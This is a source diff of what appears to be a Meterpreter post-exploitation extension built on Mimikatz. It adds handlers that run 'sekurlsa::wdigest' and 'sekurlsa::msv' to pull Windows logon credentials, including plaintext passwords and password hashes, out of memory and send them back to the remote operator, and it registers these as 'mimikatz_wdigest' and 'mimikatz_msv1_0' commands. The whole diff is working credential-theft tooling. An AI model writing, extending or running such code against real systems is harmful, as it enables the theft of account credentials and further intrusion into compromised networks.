@@ -32,26 +32,64 @@ void initialize_mimikatz()
 	}
 }
 
-DWORD request_boiler(Remote *remote, Packet *packet)
+void clear_buffer()
+{
+	oss.str(L""); 
+	oss.clear();
+}
+
+wchar_t* convert_wstring_to_wchar_t(wstring in)
+{ 
+	const wchar_t* outputStr = in.c_str(); 
+	wchar_t* out = new wchar_t[in.size()+1]; 
+	wcscpy(out, outputStr); 
+	out[in.size()] = '\0';
+	return out;
+}
+
+DWORD request_wdigest(Remote *remote, Packet *packet)
 {
 	Packet * response = packet_create_response(packet);
 	bool iResult = 0;
+
+	clear_buffer();
 
 	wstring function = (L"sekurlsa::wdigest");
 	vector<wstring> *args = new vector<wstring>();
 
 	initialize_mimikatz();
 	myMimiKatz->doCommandeLocale(&function, args);
-	//delete myMimiKatz, args;
+	delete args;
 
-	//http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
-	wstring output = oss.str(); 
-	const wchar_t* outputStr = output.c_str(); 
-	wchar_t* out = new wchar_t[output.size()+1]; 
-	wcscpy(out, outputStr); 
-	out[output.size()] = '\0';
+	wchar_t* output = convert_wstring_to_wchar_t(oss.str());
 	
-	packet_add_tlv_raw(response, TLV_MIMIKATZ_RESULT, out, wcslen(out)*sizeof(wchar_t));
+	clear_buffer();
+
+	packet_add_tlv_raw(response, TLV_MIMIKATZ_RESULT, output, wcslen(output)*sizeof(wchar_t));
+	packet_transmit_response(iResult, remote, response);
+
+	return ERROR_SUCCESS;	
+}
+
+DWORD request_msv1_0(Remote *remote, Packet *packet)
+{
+	Packet * response = packet_create_response(packet);
+	bool iResult = 0;
+
+	clear_buffer();
+
+	wstring function = (L"sekurlsa::msv");
+	vector<wstring> *args = new vector<wstring>();
+
+	initialize_mimikatz();
+	myMimiKatz->doCommandeLocale(&function, args);
+	delete args;
+
+	wchar_t* output = convert_wstring_to_wchar_t(oss.str()); 
+	
+	clear_buffer();
+
+	packet_add_tlv_raw(response, TLV_MIMIKATZ_RESULT, output, wcslen(output)*sizeof(wchar_t));
 	packet_transmit_response(iResult, remote, response);
 
 	return ERROR_SUCCESS;	
@@ -60,7 +98,11 @@ DWORD request_boiler(Remote *remote, Packet *packet)
 Command customCommands[] =
 {
 	{ "mimikatz_wdigest",
-	  { request_boiler,                                    { 0 }, 0 },
+	  { request_wdigest,                                    { 0 }, 0 },
+	  { EMPTY_DISPATCH_HANDLER                                      },
+	},
+	{ "mimikatz_msv1_0",
+	  { request_msv1_0,                                    { 0 }, 0 },
 	  { EMPTY_DISPATCH_HANDLER                                      },
 	},
 
